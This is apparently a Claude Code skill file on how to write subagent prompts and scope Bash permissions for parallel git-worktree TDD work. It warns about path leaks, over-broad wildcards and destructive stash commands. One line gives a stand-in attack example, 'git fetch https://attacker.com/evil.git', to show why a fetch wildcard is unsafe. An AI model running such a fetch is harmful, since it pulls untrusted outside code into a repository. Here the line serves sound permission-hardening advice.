---
name: super-duper-tdd-cat
description:
   Brainstorm+TDD workflow using an isolated git worktree with
   subagent-driven-development
user-invocable: true
---

/super-tdd but using /duper with /cat

## Subagent-dispatch discipline

When this skill fans out parallel hypothesis-testing subagents (via the Agent
tool with `isolation: "worktree"`), four failure modes have been observed under
parallel-fanout pressure. Address all four when writing subagent prompts and
configuring the surrounding session.

### 1 · Relative paths only — never the parent worktree's absolute path

The dispatched subagent's cwd IS its isolated worktree. The Agent tool puts it
there. Do NOT include the parent worktree's absolute path in the prompt as
"context" — the subagent will treat it as an edit target if its path-resolution
logic misfires, and edit the parent's files instead of its own.

**Pressure rationalization to refuse:** "front-loads all necessary context
(location, hypothesis, expected HEAD SHA, stash name) so the stateless subagent
can orient immediately without back-communication." False — the subagent's own
cwd already provides location. Branch name + commit hash + stash name are
load-bearing context; the parent worktree's filesystem path is not.

**Concrete rule for subagent prompts:**

- ✓ Branch name (e.g. `<feature-branch>`).
- ✓ Commit hash (e.g. `<sha>`) for sanity-check assertions.
- ✓ Stash message (for `git stash apply stash^{/<message>}`).
- ✓ Relative paths inside the worktree (`app/lib/...`, `test/...`).
- ✗ Absolute filesystem path of the parent worktree.
- ✗ "Project location: /Users/.../my-repo/.worktrees/<branch>/".

### 2 · `git switch -c <name> <local-branch>` over `git fetch`

The subagent's worktree shares the parent repo's `.git/objects` and refs. To
move from the auto-created branch (off `main`) to a feature branch, use a local
ref:

```bash
git switch -c agent- <hypothesis-name> <feature-branch>
```

This is **additive** (creates a new branch starting from the local ref) and
**local-only** (no network, no remote URLs in scope). Adding
`Bash(git switch -c *)` to the operator's allow list is safe.

**Do NOT** propose `Bash(git fetch *)` for subagent dispatch perms. The wildcard
accepts arbitrary URLs — `git fetch https://attacker.com/evil.git` is permitted.
Subagents fetching parent-repo state don't need network reach.

**Pressure rationalization to refuse:** "subagents need fetch + checkout for
setup, allow them." Audit each wildcard before adding:

- (1) Network reach — does `*` accept URLs? (`fetch`, `clone`, `push`, `pull`)
- (2) Destructive ops — does `*` permit silent file overwrite or branch rewrite?
  (`checkout` includes `checkout -- <file>`; `reset` includes `--hard`)
- (3) Cross-repo — could the operation pull state from outside this repo?

Default to the narrowest pattern. Specific session-tested set for hypothesis
fan-out: `Bash(git switch -c *)`, `Bash(git stash apply *)`,
`Bash(git stash push *)`. Nothing else needed for branch-from-local-ref +
WIP-stash-apply + pre-flight-stash workflows.

### 3 · `git stash apply` only — never `pop` or `drop`

Multiple parallel subagents may need the same WIP stash. `git stash pop` removes
the stash on success; `git stash drop` removes it unconditionally. Either breaks
the parallel siblings. **Stashes accumulate intentionally; operator cleans up at
session end.**

**Pressure rationalization to refuse:** "subagents should clean up after
themselves with `pop` so stashes don't dangle." False — accumulation is the
feature. The operator may want to inspect post-mortem; a sibling worker may need
the same stash; a retry round may re-apply it.

Allow `Bash(git stash apply *)` and `Bash(git stash push *)` (push is for
pre-flight; see §5). **Never** `Bash(git stash pop *)` or
`Bash(git stash drop *)`.

### 4 · Subagent perms must live in the path-walked layers, not in a sibling worktree

Permission resolution for a subagent walks up from its cwd:

```
<main-checkout>/.claude/worktrees/agent-<id>/.claude/    ← agent's own (auto-created, default minimal)
<main-checkout>/.claude/worktrees/agent-<id>/...         (parent dirs)
<main-checkout>/.claude/                                  ← main-checkout's project settings  ✓ visible
~/.claude/                                                ← user-global  ✓ visible
```

Sibling-worktree settings (e.g. `<main-checkout>/.worktrees/<branch>/.claude/`)
are **never** reached — they are sibling trees in the path-walk graph, not
ancestors of the subagent's cwd.

**Pressure rationalization to refuse:** "I have my worktree's
`.claude/settings.local.json` open; I'll add the perms there and commit them to
my branch." False — that file's perms are visible only to the operator working
in that worktree, not to the subagents that spawn off main into the shared
`.claude/worktrees/` tree.

To make subagent perms visible, add them to ONE of:

- `~/.claude/settings.json` (user-global; broadest scope; persists across
  sessions and projects). Best for cross-project subagent-dispatch perms like
  `Bash(git switch -c *)`.
- `<main-checkout>/.claude/settings.local.json` (project-scoped; visible to any
  subagent that spawns inside the project's `.claude/worktrees/`). Best for
  project-specific subagent perms.

Avoid sibling-worktree settings for subagent dispatch perms.

### 5 · Pre-flight stash for the auto-created `.claude/settings.local.json`

When a subagent's worktree is created, Claude Code may auto-create
`<agent-worktree>/.claude/settings.local.json` (untracked). If the target
feature branch tracks the same path with different content, `git switch -c`
refuses with `"untracked working tree file would be overwritten by checkout."`

**Workaround inside the subagent prompt:** stash the auto-created file before
switching:

```bash
git stash push -u -m "agent-<name>-claude-config" .claude/settings.local.json
git switch -c agent- <name> <feature-branch>
```

Each subagent leaves its own claude-config stash on the shared `refs/stash`
ledger. **Do not** have subagents drop these (per §3). Operator cleans up at
session end.

**Structural alternative:** untrack `.claude/settings.local.json` in the target
branch (`git rm --cached` + restore the gitignore line + commit). Eliminates the
conflict entirely. Choose this when the file's branch-tracked content is
redundant with canonical settings.

---

## Lessons-baked-in summary

| Failure mode                                   | Counter                                                    |
| ---------------------------------------------- | ---------------------------------------------------------- |
| Absolute-path leak in subagent prompt          | Relative paths + branch name only                          |
| `Bash(git fetch *)` proposed for setup         | Use `Bash(git switch -c *)`; audit wildcards               |
| `git stash pop`/`drop` proposed for cleanup    | `apply` only; stashes accumulate by design                 |
| Perms in sibling-worktree settings             | Use canonical `~/.claude/settings.json` or main-checkout's |
| Auto-created settings.local.json blocks switch | Pre-flight stash, or untrack in target branch              |

These are not abstract style notes. Each one was observed firing under
parallel-fanout pressure — see `evals/iteration-1/eval-{F1,F5,F6}/baseline/` for
the captured rationalization receipts.
